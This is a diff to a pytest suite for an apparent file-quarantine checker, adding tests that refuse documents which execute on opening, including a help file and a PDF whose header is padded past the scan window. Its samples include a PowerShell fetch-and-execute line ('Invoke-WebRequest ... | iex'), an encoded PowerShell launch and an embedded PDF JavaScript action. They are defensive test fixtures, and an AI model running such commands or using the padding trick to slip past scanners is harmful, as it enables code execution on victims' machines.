@@ -241,12 +241,14 @@ class TestCheckDocument:
             ('setup.bat', b'@echo off\r\npowershell -enc AAAA\r\n', '.bat'),
             ('book.js', b'new ActiveXObject("WScript.Shell").Run("calc")\n', '.js'),
             ('run.ps1', b'Invoke-WebRequest https://example.org | iex\n', '.ps1'),
+            ('book.chm', b'ITSF\x03\x00\x00\x00' + bytes(32), '.chm'),
+            ('setup.py', b'import os\nos.system("calc")\n', '.py'),
         ],
     )
     def test_check_without_kinds_refuses_files_that_run_when_opened(
         self, fs: FakeFilesystem, file_name: str, payload: bytes, danger: str
     ) -> None:
-        """A macro document, a Java archive or a script without a shebang is refused by its members or its name.
+        """A macro document, a Java archive, a help file or a script without a shebang is refused by its members or name.
 
         Their first bytes are those of a plain archive or of text, so only the members and the name tell that the
         file runs when it is opened.
@@ -288,6 +290,22 @@ class TestCheckDocument:
 
         with pytest.raises(SecurityError, match=re.escape('.hta')):
             check_document(path, expected=(DocumentKind.PDF, DocumentKind.DJVU))
+
+    def test_pdf_name_without_a_pdf_header_is_refused(self, fs: FakeFilesystem) -> None:
+        """A file released as a PDF whose header lies past the first kilobyte is refused instead of passing unscanned.
+
+        The content check reads the header from the first kilobyte only, while a viewer opens the file by its name and
+        parses a PDF it finds further on, so its active content would run without the key scan ever seeing it.
+
+        :param fs: the in-memory file system.
+        :type fs: FakeFilesystem
+        """
+        path = QUARANTINE / BOOK
+        padding = b'\n' * (DEFAULT_IO.head_window + 1)
+        fs.create_file(path, contents=padding + b'%PDF-1.7\n<< /OpenAction << /S /JavaScript /JS (x) >> >>')
+
+        with pytest.raises(SecurityError, match='without a PDF header'):
+            check_document(path, expected=None)
 
 
 def make_part_file(fs: FakeFilesystem, data: bytes) -> PartFile:
